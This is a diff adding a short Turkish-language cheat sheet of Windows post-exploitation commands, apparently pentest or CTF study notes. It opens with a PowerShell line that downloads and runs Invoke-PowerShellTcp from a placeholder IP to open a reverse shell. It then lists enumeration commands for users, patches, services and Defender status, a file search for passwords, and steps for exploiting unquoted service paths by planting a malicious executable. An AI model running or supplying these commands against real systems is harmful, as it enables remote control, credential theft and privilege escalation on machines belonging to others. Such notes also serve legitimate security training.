@@ -1,0 +1,61 @@
+invoke powershell tcp
+
+iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
+
+------------------------
+Kullanıcı Numaralandırma
+
+net users == kullanıcıları listeler
+net user kullanıcı == kullanıcı hakkında daha detaylı bilgi verir
+hostname == bilgisayar hakkında bilgi
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" == OS bilgisi
+
+----------------------
+
+Dosya-dizin arama
+
+findstr /si password *.txt == içerisinde "password" geçen bütün dosyaları gösterir
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn == yüklenmiş güncellemeleri gösterir, böylece eksik güncelleme var ise ondan yararlanabiliriz
+
+---------------------
+Ağ bağlantıları
+
+netstat -ano == ağ içerisindeki açık portlar ve internet hakkında bilgi verir
+-----------------------
+Zamanlanmış Görevler(crontab gibi düşünülebilir)
+
+schtasks == crontab
+
+schtasks /query /fo LIST /v == admin yetkisinde çalışanlar
+
+------------------------
+Sürücüleri görüntülemek
+
+driverquery == sürücüleri gösterir
+
+------------------
+antivirüs
+
+sc query windefend == windefen'in aktif durumunu belirtecek
+
+sc queryex type=deneme == deneme isimli antivirüs var mı yok mu varsa ne durumda bize haber verecek
+
+-----------------------
+WinPEAS == linpeas
+
+---------------------
+Hizmet yazılımlarında açık arama
+
+wmic product == yüklü yazılımlarda bilgi arayacak ve bize dökecek
+
+wmic product get name,version,vendor == isim versiyon gibi daha detaylı bunu kullan
+
+wmic service list brief | findstr  "Running" == her şeyü gösterecek ama çalışan
+
+sc qc "HizmetAdı" == yukarıdak komutlarla elde edilen bilgileri bu komutu kullanarak detaylanrırırız.
+
+-------------------------
+Belirtilmeyen Hizmet Yolu Güvenlik Açıklarını Bulma
+
+wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows" = tırnak işareti olmayan çıktı alırsan ona saldır(bu olay siçin servisi "sc stop servisadı" komutuyla durdurmamız lazım. ondan sonra o protgrama giden path de bizim yazabildiğimiz bir alan var ise oraya zararlı exe dosyamızı koyup dinlemeye almamız lazım sonra da servisi başlatmamız lazım)
